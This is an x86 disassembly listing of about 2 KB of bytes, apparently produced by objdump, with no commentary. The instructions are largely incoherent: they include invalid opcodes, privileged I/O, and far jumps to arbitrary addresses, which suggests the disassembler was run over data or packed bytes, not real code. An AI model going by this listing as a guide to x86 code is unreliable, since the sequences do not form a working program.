  40927c:	push   edx
  40927d:	inc    eax
  40927e:	and    dl,dh
  409280:	and    al,0x52
  409282:	dec    ecx
  409283:	sbb    eax,0x4da2d2a4
  409288:	outs   dx,DWORD PTR ds:[esi]
  409289:	es addr16 jg 0x40920e
  40928d:	icebp  
  40928e:	inc    edx
  40928f:	inc    edx
  409290:	adc    al,BYTE PTR [ebx+0x69]
  409293:	xchg   esp,eax
  409294:	or     eax,0x5a06f50
  409299:	cli    
  40929a:	int    0x5e
  40929c:	(bad)  
  40929d:	jne    0x40922c
  40929f:	(bad)  
  4092a0:	addr16 retf 
  4092a2:	aaa    
  4092a3:	push   ss
  4092a4:	xlat   BYTE PTR ds:[ebx]
  4092a5:	aad    0x31
  4092a7:	pop    esi
  4092a8:	fcom   st(7)
  4092aa:	pop    eax
  4092ab:	mov    esi,0x753b4179
  4092b0:	xor    eax,0x5ff9a
  4092b5:	mov    eax,ds:0x1918078e
  4092ba:	sbb    eax,0x7bbb836e
  4092bf:	repnz sbb al,0x12
  4092c2:	loopne 0x40926f
  4092c4:	stos   DWORD PTR es:[edi],eax
  4092c5:	hlt    
  4092c6:	inc    ebp
  4092c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c8:	rol    BYTE PTR [eax],1
  4092ca:	ret    0xe587
  4092cd:	mov    edx,0x3cb47c0f
  4092d2:	dec    esp
  4092d3:	cmp    DWORD PTR [esi],ebx
  4092d5:	ror    ebp,cl
  4092d7:	call   0x89db9431
  4092dc:	sbb    DWORD PTR es:[esp+esi*2+0x3d632b27],edi
  4092e4:	or     eax,0x41020c1d
  4092e9:	popf   
  4092ea:	xchg   BYTE PTR [ebp-0x2],ch
  4092ed:	xor    ebx,ecx
  4092ef:	outs   dx,BYTE PTR ds:[esi]
  4092f0:	stos   BYTE PTR es:[edi],al
  4092f1:	(bad)  
  4092f2:	cwde   
  4092f3:	aas    
  4092f4:	rcr    BYTE PTR [ecx+0x27086e0e],1
  4092fa:	sbb    BYTE PTR [esi],ah
  4092fc:	aam    0x2a
  4092fe:	push   eax
  4092ff:	gs jp  0x409331
  409302:	push   ebp
  409303:	fsubr  QWORD PTR [eax+0x38]
  409306:	jl     0x4092b1
  409308:	les    eax,FWORD PTR [ebx-0x5e]
  40930b:	jmp    FWORD PTR [edx+0xc5aafe4]
  409311:	out    0x9f,al
  409313:	int3   
  409314:	out    0xad,eax
  409316:	mov    ebp,0x319444ba
  40931b:	xchg   esi,eax
  40931c:	cmp    BYTE PTR [ebx+esi*4],dh
  40931f:	loopne 0x409365
  409321:	dec    edx
  409322:	cmp    bl,BYTE PTR [edi-0x49b7be8b]
  409328:	or     DWORD PTR [edx-0x2f22c945],edi
  40932e:	sti    
  40932f:	test   eax,0x458c097
  409334:	mov    ch,BYTE PTR [edx+0x3e1052fb]
  40933a:	xchg   ecx,edx
  40933c:	cld    
  40933d:	loop   0x4092cf
  40933f:	ror    DWORD PTR [ebp+0x17],0xaf
  409343:	mov    edi,DWORD PTR [edx-0x4a]
  409346:	or     ch,BYTE PTR [esi+0x10]
  409349:	pop    ebx
  40934a:	mov    bl,0xb0
  40934c:	rcr    dh,1
  40934e:	test   BYTE PTR ds:0x82cf7306,al
  409354:	and    ebp,ecx
  409356:	xchg   edi,eax
  409357:	stos   DWORD PTR es:[edi],eax
  409358:	push   edx
  409359:	add    ebp,DWORD PTR [ebx-0x3e]
  40935c:	outs   dx,DWORD PTR ds:[esi]
  40935d:	xor    cl,BYTE PTR [edx]
  40935f:	push   0x2976cbd4
  409364:	inc    esp
  409365:	fs mov ebx,0xff94da4
  40936b:	jmp    FWORD PTR [eax-0x43]
  40936e:	xchg   esp,eax
  40936f:	adc    eax,0xfbc64e99
  409374:	push   ss
  409375:	addr16 sub eax,0xb2c0add4
  40937b:	xor    DWORD PTR [esi+0x7b],ebp
  40937e:	aaa    
  40937f:	scas   al,BYTE PTR es:[edi]
  409380:	xchg   esp,eax
  409381:	test   DWORD PTR [esi],eax
  409383:	xchg   esp,eax
  409384:	cli    
  409385:	push   sp
  409387:	cwde   
  409388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409389:	dec    edx
  40938a:	repnz push esi
  40938c:	mov    ebp,0xbe3002d
  409391:	xchg   ebp,eax
  409392:	div    ebp
  409394:	cld    
  409395:	cs rcl edx,0x2f
  409399:	es sbb bh,dl
  40939c:	mov    dl,0xad
  40939e:	leave  
  40939f:	loope  0x409368
  4093a1:	mov    edx,0x7402a1ae
  4093a6:	out    0x5,eax
  4093a8:	daa    
  4093a9:	jns    0x409414
  4093ab:	lock hlt 
  4093ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ae:	xchg   edx,eax
  4093af:	adc    eax,0x3e5c7110
  4093b4:	out    0xac,eax
  4093b6:	add    eax,0xb46f2839
  4093bb:	in     al,dx
  4093bc:	popf   
  4093bd:	popf   
  4093be:	mov    al,0xcb
  4093c0:	fwait
  4093c1:	sub    al,0x85
  4093c3:	aas    
  4093c4:	div    BYTE PTR [eax+0x6ea643a5]
  4093ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093cb:	push   esp
  4093cc:	fild   DWORD PTR [ecx]
  4093ce:	ret    0x5c85
  4093d1:	fmul   DWORD PTR [esi+edx*2-0x38]
  4093d5:	sbb    BYTE PTR [edi],bh
  4093d7:	or     al,0x56
  4093d9:	pop    ds
  4093da:	jae    0x40942d
  4093dc:	nop
  4093dd:	push   ebx
  4093de:	imul   esp,ebx,0xce767f4d
  4093e4:	adc    eax,0x70338b75
  4093e9:	xchg   esi,eax
  4093ea:	and    BYTE PTR [ebx-0x49],bl
  4093ed:	or     DWORD PTR [esi],0x2b
  4093f0:	cmp    ah,BYTE PTR [ebx-0x22db28cf]
  4093f6:	jle    0x40940f
  4093f8:	aas    
  4093f9:	loope  0x409441
  4093fb:	(bad)  
  4093fc:	fdivr  st,st(7)
  4093fe:	mov    edx,eax
  409400:	or     ebp,edx
  409402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409403:	(bad)  
  409404:	push   0xffffffdf
  409406:	out    dx,eax
  409407:	jns    0x40946b
  409409:	push   es
  40940a:	sbb    esp,DWORD PTR ds:0xec37f497
  409410:	jge    0x4093ec
  409412:	sbb    al,0x6b
  409414:	cmp    al,0x9b
  409416:	push   esi
  409417:	(bad)  
  409418:	imul   bl
  40941a:	xlat   BYTE PTR ds:[ebx]
  40941b:	rcr    BYTE PTR [edx],cl
  40941d:	push   ds
  40941e:	pop    es
  40941f:	push   ss
  409420:	push   cs
  409421:	(bad)  [ecx-0x1f]
  409424:	jle    0x4093ac
  409426:	iret   
  409427:	cdq    
  409428:	mov    ecx,0x5138624
  40942d:	sbb    al,0x3f
  40942f:	arpl   WORD PTR cs:0xe05b9e52,dx
  409436:	js     0x409491
  409438:	jmp    DWORD PTR [esi+0x2a701c00]
  40943e:	ss into 
  409440:	push   esp
  409441:	fcmovnb st,st(4)
  409443:	jmp    0x409412
  409445:	cmp    DWORD PTR [ecx],eax
  409447:	std    
  409448:	loop   0x4093d9
  40944a:	push   es
  40944b:	push   ss
  40944c:	jns    0x40941e
  40944e:	push   ds
  40944f:	sub    DWORD PTR [edx+0x7d],ecx
  409452:	push   ebx
  409453:	mov    ds:0xf93bd507,al
  409458:	call   0x765d:0x7e639a38
  40945f:	mov    BYTE PTR [eax-0x6],dh
  409462:	sub    DWORD PTR [ebx],ecx
  409464:	push   0xcdc00956
  409469:	aam    0xbc
  40946b:	push   esp
  40946c:	jb     0x40942a
  40946e:	pop    esp
  40946f:	push   edx
  409470:	jmp    0xb94d:0x806bd49d
  409477:	test   DWORD PTR [edi-0x76a1897d],0x2dfd296d
  409481:	cmp    BYTE PTR [ecx],ch
  409483:	ror    DWORD PTR [edx-0x7b],1
  409486:	pop    esp
  409487:	push   ebx
  409488:	neg    BYTE PTR [ebx+0x20]
  40948b:	add    DWORD PTR [edi],ecx
  40948d:	test   al,0x57
  40948f:	(bad)  
  409491:	pushf  
  409492:	sub    BYTE PTR [ebx-0x2e],ah
  409495:	mov    ch,0x82
  409497:	test   BYTE PTR ds:0x9bf636b6,ch
  40949d:	ror    BYTE PTR [esi],0xdf
  4094a0:	cmp    eax,0x114c802a
  4094a5:	add    esp,ebp
  4094a7:	jns    0x40951c
  4094a9:	rcr    DWORD PTR [eax],1
  4094ab:	icebp  
  4094ac:	mov    cl,0x96
  4094ae:	jmp    0x40947f
  4094b0:	ins    BYTE PTR es:[edi],dx
  4094b1:	dec    ebp
  4094b2:	nop
  4094b3:	ins    DWORD PTR es:[edi],dx
  4094b4:	pop    esp
  4094b5:	test   DWORD PTR [ecx-0x60],esp
  4094b8:	pop    ebp
  4094b9:	adc    al,0x13
  4094bb:	mov    eax,0x7e01bf28
  4094c0:	lods   al,BYTE PTR ds:[esi]
  4094c1:	sbb    DWORD PTR [edi+0x6eb9fbb5],edi
  4094c7:	enter  0xf7cf,0xd7
  4094cb:	xor    eax,0x51bbfeaf
  4094d0:	adc    bh,bl
  4094d2:	xor    BYTE PTR [esi],dl
  4094d4:	adc    eax,0xd8646abc
  4094d9:	mov    bh,0x7f
  4094db:	xchg   ebx,eax
  4094dc:	dec    edx
  4094dd:	and    eax,0xb740e65b
  4094e2:	js     0x40953a
  4094e4:	sbb    eax,0x7a0eb886
  4094e9:	std    
  4094ea:	inc    ecx
  4094eb:	bound  edi,QWORD PTR [ebp+0x5832974]
  4094f1:	scas   al,BYTE PTR es:[edi]
  4094f2:	arpl   WORD PTR [edi+eax*4+0x30],si
  4094f6:	test   al,0x1c
  4094f8:	in     al,0xad
  4094fa:	nop
  4094fb:	pop    esp
  4094fc:	test   al,bl
  4094fe:	mov    ds:0x399f09b8,eax
  409503:	sbb    DWORD PTR [esp+ebx*8+0x52],0xc
  409508:	rol    BYTE PTR [ecx],1
  40950a:	xchg   ebx,eax
  40950b:	pop    es
  40950c:	xchg   ebx,eax
  40950d:	cmp    esi,eax
  40950f:	enter  0x2414,0xf9
  409513:	adc    al,0xe
  409515:	mov    BYTE PTR ds:0x60c4aea8,0x21
  40951c:	inc    edx
  40951d:	cmp    dl,BYTE PTR [esi]
  40951f:	or     BYTE PTR ds:0x2d32abd1,bh
  409525:	outs   dx,DWORD PTR ds:[esi]
  409526:	int    0xbe
  409528:	mov    edi,0x9253c7f1
  40952d:	pusha  
  40952e:	dec    ecx
  40952f:	imul   esi,DWORD PTR [esi+0x22adf838],0xfffffff7
  409536:	loope  0x40955f
  409538:	pop    esp
  409539:	adc    BYTE PTR [esp+ecx*8+0x10659e57],cl
  409540:	mov    bh,0x90
  409542:	aam    0x40
  409544:	and    DWORD PTR [edi-0x68ed451b],ecx
  40954a:	mov    ebp,0x82fae813
  40954f:	pop    ebx
  409550:	popf   
  409551:	push   esi
  409552:	add    bl,ch
  409554:	in     al,0x47
  409556:	sti    
  409557:	xchg   BYTE PTR [esi+0x45a8acdf],al
  40955d:	fidivr WORD PTR [ecx+eax*1]
  409560:	out    dx,al
  409561:	mov    ds:0xe8676217,eax
  409566:	xchg   edx,eax
  409567:	jl     0x4095be
  409569:	iret   
  40956a:	sub    eax,0xfb5e4516
  40956f:	out    dx,al
  409570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409571:	mov    edx,edx
  409573:	pop    ebx
  409574:	xchg   ecx,eax
  409575:	fdivr  DWORD PTR ds:0xfc6946ea
  40957b:	sub    dl,BYTE PTR [eax+eiz*4+0xf]
  40957f:	push   edi
  409580:	int    0xf0
  409582:	shr    DWORD PTR [ecx-0x1c],0x4e
  409586:	adc    al,0xa
  409588:	clc    
  409589:	(bad)  
  40958a:	push   cs
  40958b:	xchg   ecx,eax
  40958c:	in     al,dx
  40958d:	xchg   BYTE PTR [eax-0x7fec5fc9],al
  409593:	call   0x2fc6:0xc0eb9695
  40959a:	and    ah,al
  40959c:	sub    DWORD PTR [edi-0x2af247e8],0xffffff8b
  4095a3:	adc    al,0x19
  4095a5:	test   DWORD PTR [edi-0xc533951],edi
  4095ab:	adc    al,BYTE PTR [esi+0x7a8d923c]
  4095b1:	xor    eax,0x111c199d
  4095b6:	mov    al,ds:0x6eb1e613
  4095bb:	jno    0x40959e
  4095bd:	xchg   esp,eax
  4095be:	jmp    0xfd09135
  4095c3:	xchg   esp,eax
  4095c4:	popa   
  4095c5:	es push 0x51
  4095c8:	leave  
  4095c9:	push   ebx
  4095ca:	sub    DWORD PTR [eax-0xc9d84e],ecx
  4095d0:	ins    DWORD PTR es:[edi],dx
  4095d1:	test   al,0x49
  4095d3:	popf   
  4095d4:	out    dx,al
  4095d5:	ins    BYTE PTR es:[edi],dx
  4095d6:	dec    ebx
  4095d7:	test   eax,0xf7af23b4
  4095dc:	xor    bh,BYTE PTR gs:[esi+0x3ce3ece0]
  4095e3:	test   al,0x81
  4095e5:	jbe    0x40960d
  4095e7:	xor    DWORD PTR [edi+eiz*8-0x6e],eax
  4095eb:	div    DWORD PTR ds:0xf7e882bf
  4095f1:	bound  ebp,QWORD PTR [ecx+ebp*4+0x1d]
  4095f5:	stc    
  4095f6:	cmp    DWORD PTR [edx],ebx
  4095f8:	cmp    ebp,DWORD PTR [eax-0x59]
  4095fb:	cmp    dh,BYTE PTR [esp+ecx*2-0x3463b8f8]
  409602:	(bad)  
  409603:	popa   
  409604:	(bad)  
  409605:	and    eax,0x5243dc52
  40960a:	mov    al,cl
  40960c:	lahf   
  40960d:	adc    eax,0x1473d216
  409612:	xor    edx,ebx
  409614:	push   0xc0fa3299
  409619:	cmp    ebx,ebx
  40961b:	adc    edx,DWORD PTR [edi+0x2a]
  40961e:	sti    
  40961f:	inc    edi
  409620:	sahf   
  409621:	dec    edx
  409622:	adc    DWORD PTR [ebx-0x433b0eb1],0x1282ee6c
  40962c:	cmp    BYTE PTR [ecx+ebx*8],0x8d
  409630:	push   0xb6f8c91d
  409635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409637:	mov    bh,0x1a
  409639:	imul   esp,DWORD PTR fs:[esi+0x604ae0c3],0xc03db71d
  409644:	fidivr DWORD PTR [esi+0x30d0c256]
  40964a:	xor    esi,DWORD PTR [edx-0x20]
  40964d:	shl    BYTE PTR [esi-0x764495cc],0x77
  409654:	sbb    bh,dh
  409656:	cmc    
  409657:	(bad)  [edx-0x2a]
  40965a:	or     eax,0xf8262e8b
  40965f:	inc    eax
  409660:	xor    ch,BYTE PTR [ebx+0x1ecb9695]
  409666:	or     eax,0x4f8a3193
  40966b:	daa    
  40966c:	adc    BYTE PTR [ebx-0xd1f3642],ch
  409672:	jecxz  0x409609
  409674:	clc    
  409675:	cwde   
  409676:	sbb    eax,0x86137b24
  40967b:	aas    
  40967c:	cmp    DWORD PTR [edi+0xdd804f9],ecx
  409682:	or     DWORD PTR [edi],eax
  409684:	lea    ebp,[eax+0x17]
  409687:	aam    0xb0
  409689:	outs   dx,BYTE PTR ds:[esi]
  40968a:	retf   0xcaa3
  40968d:	mov    dl,0x17
  40968f:	idiv   DWORD PTR [eax+0x2c518e0c]
  409695:	cmp    bl,BYTE PTR [esi+0x19dae813]
  40969b:	push   ebp
  40969c:	or     eax,esp
  40969e:	xchg   esp,eax
  40969f:	retf   
  4096a0:	inc    edi
  4096a1:	add    eax,0x3a35cf6f
  4096a6:	adc    dl,BYTE PTR [ecx-0x58]
  4096a9:	mov    DWORD PTR [eax+0x2ec3726],esi
  4096af:	inc    esi
  4096b0:	stos   DWORD PTR es:[edi],eax
  4096b1:	sub    eax,0x4ad4b01a
  4096b6:	adc    al,0xbe
  4096b8:	mov    BYTE PTR [edx+ebx*2-0x554f3da1],0xb6
  4096c0:	sub    esi,esp
  4096c2:	jo     0x409701
  4096c4:	pop    edx
  4096c5:	jmp    0x4096f3
  4096c7:	call   0xa19dc558
  4096cc:	mov    cl,0x80
  4096ce:	outs   dx,DWORD PTR ds:[esi]
  4096cf:	imul   BYTE PTR [ebx]
  4096d1:	nop
  4096d2:	aas    
  4096d3:	(bad)  
  4096d5:	push   ds
  4096d6:	adc    eax,0x16ba49ba
  4096db:	imul   ebx,DWORD PTR [ebp+0x63],0xfffffff8
  4096df:	call   0xb7e6dc00
  4096e4:	fsubr  st,st(0)
  4096e6:	outs   dx,DWORD PTR ds:[esi]
  4096e7:	loopne 0x409720
  4096e9:	dec    esi
  4096ea:	call   FWORD PTR [eax-0x3e6acc40]
  4096f0:	push   edi
  4096f1:	xchg   esp,eax
  4096f2:	xchg   esp,eax
  4096f3:	mov    BYTE PTR ds:0x49fc0f6e,dh
  4096f9:	repz pop ebx
  4096fb:	cmp    esp,DWORD PTR [eax-0x2e]
  4096fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096ff:	mov    edi,0x1445ba09
  409704:	sub    al,0x3c
  409706:	pop    ss
  409707:	jmp    0x55a9:0x1fec06f4
  40970e:	cmc    
  40970f:	sbb    DWORD PTR [ecx-0x71],esi
  409712:	sbb    DWORD PTR [ebx],esp
  409714:	cmp    eax,0xcd325cd2
  409719:	or     al,0xbd
  40971b:	and    eax,0x82df0cd6
  409720:	sbb    edi,DWORD PTR [ebx-0x1591c912]
  409726:	stos   DWORD PTR es:[edi],eax
  409727:	scas   al,BYTE PTR es:[edi]
  409728:	push   ebp
  409729:	xchg   edx,eax
  40972a:	jecxz  0x409795
  40972c:	xchg   ebp,eax
  40972d:	sbb    DWORD PTR [ebx-0x51d5f48f],0x2fa5dace
  409737:	addr16 cwde 
  409739:	arpl   bp,sp
  40973b:	outs   dx,DWORD PTR ds:[esi]
  40973c:	cdq    
  40973d:	sbb    edi,DWORD PTR [esi+0x9044414]
  409743:	xor    bh,BYTE PTR [edi-0x80]
  409746:	mov    edx,0xe260e997
  40974b:	pop    ss
  40974c:	and    DWORD PTR [edi],ebp
  40974e:	xlat   BYTE PTR ds:[ebx]
  40974f:	jl     0x40973a
  409751:	scas   eax,DWORD PTR es:[edi]
  409752:	sbb    dl,al
  409754:	sahf   
  409755:	xchg   ebp,eax
  409756:	das    
  409757:	fadd   DWORD PTR [eax+0x778ab17b]
  40975d:	(bad)  
  40975e:	mov    eax,eax
  409760:	aam    0x25
  409762:	fsubr  QWORD PTR [esi+0xb]
  409765:	adc    al,0xb7
  409767:	shl    BYTE PTR ds:0x87efcc03,cl
  40976d:	add    eax,0x694d19a3
  409772:	sub    dh,BYTE PTR [ecx-0x7409d700]
  409778:	pop    ebx
  409779:	cli    
  40977a:	pusha  
  40977b:	lods   eax,DWORD PTR ds:[esi]
  40977c:	xlat   BYTE PTR ds:[ebx]
  40977d:	jnp    0x4097e0
  40977f:	jg     0x4097ad
  409781:	pop    ebp
  409782:	or     eax,ecx
  409784:	push   edx
  409785:	jne    0x409774
  409787:	dec    ecx
  409788:	(bad)  
  409789:	sbb    DWORD PTR [eax-0x3742fa0b],ebx
  40978f:	inc    esi
  409790:	xor    al,BYTE PTR ds:0x7dc4a083
  409796:	dec    esp
  409797:	outs   dx,DWORD PTR ds:[esi]
  409798:	jl     0x4097f3
  40979a:	dec    edi
  40979b:	jne    0x4097e2
  40979d:	jns    0x4097f4
  40979f:	les    edx,FWORD PTR [edi+0x7d]
  4097a2:	add    al,0x41
  4097a4:	jmp    0x40981e
  4097a6:	cmp    eax,0x6a95fbbb
  4097ab:	fld    st(2)
  4097ad:	jnp    0x409780
  4097af:	lods   al,BYTE PTR ds:[esi]
  4097b0:	sbb    dh,ah
  4097b2:	mov    ds:0xa403ed9d,eax
  4097b7:	xor    al,0x14
  4097b9:	popfw  
  4097bb:	inc    ecx
  4097bc:	cmc    
  4097bd:	mov    ds:0xe78e542a,al
  4097c2:	dec    ebx
  4097c3:	push   ebp
  4097c4:	sub    al,0x21
  4097c6:	dec    eax
  4097c7:	mov    ecx,0xaa83c611
  4097cc:	test   al,0xc9
  4097ce:	icebp  
  4097cf:	ins    DWORD PTR es:[edi],dx
  4097d0:	mov    esi,0xdece9f1d
  4097d5:	pop    eax
  4097d6:	cmp    edx,DWORD PTR [ebx-0x38f5b52]
  4097dc:	xchg   ebp,eax
  4097dd:	mov    ds:0xe5ecc312,al
  4097e2:	push   ecx
  4097e3:	or     BYTE PTR [eax+0x3a11dd3a],dl
  4097e9:	dec    esp
  4097ea:	ror    esi,cl
  4097ec:	pop    ss
  4097ed:	ret    
  4097ee:	outs   dx,BYTE PTR ds:[esi]
  4097ef:	inc    esi
  4097f0:	mov    edx,0x501d8adc
  4097f5:	test   DWORD PTR [eax+0x3bb506c0],ecx
  4097fb:	lahf   
  4097fc:	sub    al,0xa8
  4097fe:	push   cs
  4097ff:	dec    edx
  409800:	ret    0x6c
  409803:	aad    0x47
  409805:	ja     0x409800
  409807:	or     al,BYTE PTR [ebx+edi*4+0x1d]
  40980b:	inc    ecx
  40980c:	ficom  DWORD PTR ds:0x86450719
  409812:	arpl   WORD PTR [edi],ax
  409814:	mov    ds:0xeee5451,al
  409819:	jecxz  0x40984e
  40981b:	rcl    DWORD PTR [edi],cl
  40981d:	test   eax,0xc05cd4f9
  409822:	mov    ebx,0x8034500b
  409827:	push   esp
  409828:	add    al,0xbd
  40982a:	push   0x8edd13ae
  40982f:	sbb    DWORD PTR [edx+ecx*8+0xc],esp
  409833:	in     eax,dx
  409834:	mov    cl,0x2c
  409836:	xor    DWORD PTR [edx],ecx
  409838:	pop    edi
  409839:	out    0xed,al
  40983b:	mov    bl,0x5b
  40983d:	stos   BYTE PTR es:[edi],al
  40983e:	daa    
  40983f:	fsub   DWORD PTR [edx+0x1]
  409842:	scas   al,BYTE PTR es:[edi]
  409843:	outs   dx,BYTE PTR ds:[esi]
  409844:	or     DWORD PTR [edi+ebp*1],esp
  409847:	and    al,0x4f
  409849:	retf   
  40984a:	inc    ebp
  40984b:	fmul   DWORD PTR fs:[eax]
  40984e:	xchg   esp,eax
  40984f:	or     eax,0xf115d263
  409854:	ror    DWORD PTR [edi+ecx*1],1
  409857:	or     al,0x5c
  409859:	aas    
  40985a:	push   0x60da1211
  40985f:	add    DWORD PTR [eax],0xffffffb6
  409862:	sub    eax,0x31a5a338
  409867:	jbe    0x409804
  409869:	xor    bh,BYTE PTR [eax-0x59]
  40986c:	cmp    cl,BYTE PTR [ebp-0x4b45fcac]
  409872:	aas    
  409873:	dec    ebp
  409874:	sbb    eax,DWORD PTR [edx]
  409876:	fwait
  409877:	(bad)  
  409878:	sbb    al,0xea
  40987a:	xchg   ecx,eax
  40987b:	jnp    0x409893
  40987d:	test   dh,dh
  40987f:	inc    DWORD PTR [edi+0x2b]
  409882:	and    ah,bh
  409884:	jno    0x40987a
  409886:	pop    edx
  409887:	pusha  
  409888:	push   cs
  409889:	pop    eax
  40988a:	jle    0x4098e4
  40988c:	in     eax,dx
  40988d:	add    BYTE PTR [ecx],ch
  40988f:	es popa 
  409891:	test   al,0x95
  409893:	idiv   DWORD PTR [edi+0x6b]
  409896:	(bad)  
  409897:	mov    ds:0x73d0af0a,al
  40989c:	or     al,0xa3
  40989e:	dec    esi
  40989f:	sub    ah,BYTE PTR [ebx-0x25846c5]
  4098a5:	cmp    bl,BYTE PTR [edx]
  4098a7:	mov    ds:0x96c83cfa,eax
  4098ac:	adc    dh,BYTE PTR [ebx+0x3a48996d]
  4098b2:	push   esi
  4098b3:	cmp    dl,BYTE PTR [esi-0x4c]
  4098b6:	test   DWORD PTR [eax-0x57f6002e],ecx
  4098bc:	(bad)  
  4098bd:	retf   
  4098be:	fwait
  4098bf:	pop    es
  4098c0:	dec    eax
  4098c1:	mov    WORD PTR [esp+ebp*1-0x5e16142c],ss
  4098c8:	neg    edx
  4098ca:	adc    DWORD PTR [ebp+0x67],ecx
  4098cd:	fldcw  WORD PTR [edi+0x7fc48a56]
  4098d3:	iret   
  4098d4:	sbb    al,0xbd
  4098d6:	cli    
  4098d7:	jle    0x409931
  4098d9:	sahf   
  4098da:	adc    al,0x26
  4098dc:	xor    ebx,eax
  4098de:	and    dl,bh
  4098e0:	mov    eax,ds:0x60565746
  4098e5:	dec    ebp
  4098e6:	mov    al,0xa6
  4098e8:	(bad)
  4098eb:	mov    dh,0xeb
  4098ed:	add    al,0x13
  4098ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098f0:	arpl   sp,sp
  4098f2:	jle    0x409937
  4098f4:	cmp    dh,BYTE PTR [ebx]
  4098f6:	jl     0x4098fa
  4098f8:	push   esi
  4098f9:	clc    
  4098fa:	xchg   ebx,eax
  4098fb:	mov    bh,0x7e
  4098fd:	loopne 0x409899
  4098ff:	pushf  
  409900:	scas   al,BYTE PTR es:[edi]
  409901:	bound  eax,QWORD PTR [edi-0x586449b4]
  409907:	pop    esp
  409908:	test   DWORD PTR [edx-0xb7c3da2],ebp
  40990e:	test   al,0xfc
  409910:	test   BYTE PTR [ebp-0x6e],ch
  409913:	ja     0x4098ea
  409915:	push   edi
  409916:	mov    ah,0x44
  409918:	cwde   
  409919:	push   eax
  40991a:	sar    ecx,1
  40991c:	inc    eax
  40991d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40991e:	mov    ebx,0xe4a3d4d0
  409923:	xchg   edi,eax
  409924:	icebp  
  409925:	fnstenv [esi+esi*2-0x4b]
  409929:	neg    DWORD PTR [ebx]
  40992b:	jns    0x4098d8
  40992d:	sbb    dh,cl
  40992f:	cwde   
  409930:	ror    BYTE PTR [esi+eiz*8-0x3a5778e7],1
  409937:	pop    ebp
  409938:	fs push esi
  40993a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40993b:	xor    dl,BYTE PTR [eax]
  40993d:	imul   ebx,ebx,0x12
  409940:	cld    
  409941:	gs stos DWORD PTR es:[edi],eax
  409943:	lea    ebx,[esi]
  409945:	sbb    eax,0x106f66d3
  40994a:	rcpps  xmm1,xmm1
  40994d:	mov    ch,BYTE PTR [ecx]
  40994f:	popa   
  409950:	ja     0x40992b
  409952:	jp     0x4099c4
  409954:	push   cs
  409955:	push   eax
  409956:	mov    ah,0xab
  409958:	push   ebp
  409959:	sbb    al,0xa9
  40995b:	clc    
  40995c:	sahf   
  40995d:	arpl   WORD PTR [esi+0x0],dx
  409960:	mov    ch,0x59
  409962:	xor    bh,BYTE PTR [eax-0x32109b01]
  409968:	mov    ebp,0xb15484c7
  40996d:	add    ecx,edx
  40996f:	cmp    edi,DWORD PTR [eax]
  409971:	int3   
  409972:	xchg   BYTE PTR [ecx-0x5769723],bl
  409978:	xor    eax,0x23a3a2e0
  40997d:	push   ds
  40997e:	sbb    eax,0xc620b0ab
  409983:	mov    ecx,0x6cbecaa4
  409988:	data16 icebp 
  40998a:	rol    DWORD PTR [edi-0x77],0xa
  40998e:	scas   al,BYTE PTR es:[edi]
  40998f:	outs   dx,BYTE PTR ds:[esi]
  409990:	inc    ebp
  409991:	lea    ebx,[ecx-0x7a]
  409994:	ins    DWORD PTR es:[edi],dx
  409995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409996:	mov    edx,DWORD PTR [esi-0x209f9ec0]
  40999c:	sub    al,dl
  40999e:	mov    BYTE PTR [esi+0x3230fcc],bh
  4099a4:	and    esp,DWORD PTR [esi+0x1f]
  4099a7:	fmul   QWORD PTR [ebp-0x2f4bce75]
  4099ad:	rcr    DWORD PTR [eax+0x431a2b96],0xe7
  4099b4:	xor    ecx,DWORD PTR [edx+0x994cc2a]
  4099ba:	(bad)  
  4099bb:	cs into 
  4099bd:	mov    al,ds:0xfb6890dc
  4099c2:	jo     0x40999a
  4099c4:	inc    ebp
  4099c5:	repz mov ch,0xbc
  4099c8:	inc    ecx
  4099c9:	outs   dx,BYTE PTR ds:[esi]
  4099ca:	pop    edx
  4099cb:	inc    eax
  4099cc:	lock in al,dx
  4099ce:	xchg   ebx,eax
  4099cf:	cmp    eax,0xbc9343ce
  4099d4:	clc    
  4099d5:	and    eax,0x828264c5
  4099da:	push   ss
  4099db:	and    bl,BYTE PTR [edx-0x68c82b11]
  4099e1:	sbb    BYTE PTR [edx-0x213584dc],dh
  4099e7:	pop    ecx
  4099e8:	rol    DWORD PTR [eax-0x7e],1
  4099eb:	jns    0x409a29
  4099ed:	lods   eax,DWORD PTR ds:[esi]
  4099ee:	xchg   DWORD PTR ds:0x5a7cdfd9,eax
  4099f4:	(bad)  
  4099f5:	cmp    DWORD PTR [edi-0x5f848524],ebx
  4099fb:	pop    es
  4099fc:	add    ch,ch
  4099fe:	inc    esi
  4099ff:	pop    ss
  409a00:	sbb    al,0xe8
  409a02:	js     0x409986
  409a04:	dec    esi
  409a05:	lock mov bh,0xf2
  409a08:	js     0x409994
  409a0a:	xor    DWORD PTR [ebx],esi
  409a0c:	adc    BYTE PTR [ebp-0x17],cl
  409a0f:	push   ebx
  409a10:	push   esp
  409a11:	mov    esp,0x43ac2f76
  409a16:	shr    DWORD PTR [edx+0x58],cl
  409a19:	lea    ebx,[ebp-0x38]
  409a1c:	cwde   
  409a1d:	(bad)  
  409a1e:	jae    0x4099a5
  409a20:	push   edi
  409a21:	mov    edx,0xdd2c5745
  409a26:	imul   eax,ecx,0x1fed2f5
  409a2c:	out    dx,eax
  409a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a2e:	pop    es
  409a2f:	jo     0x4099e9
  409a31:	popa   
  409a32:	or     ebx,ebx
  409a34:	shr    BYTE PTR [ebp+0x1c1606f3],1
  409a3a:	inc    esp
  409a3b:	mov    eax,ds:0x57561640
  409a40:	mov    eax,ds:0xdfc2a4cc
  409a45:	add    BYTE PTR [edx],dl
  409a47:	add    al,0xae
  409a49:	xor    eax,0x4723a8f4
  409a4e:	push   esi
  409a4f:	jae    0x409a53
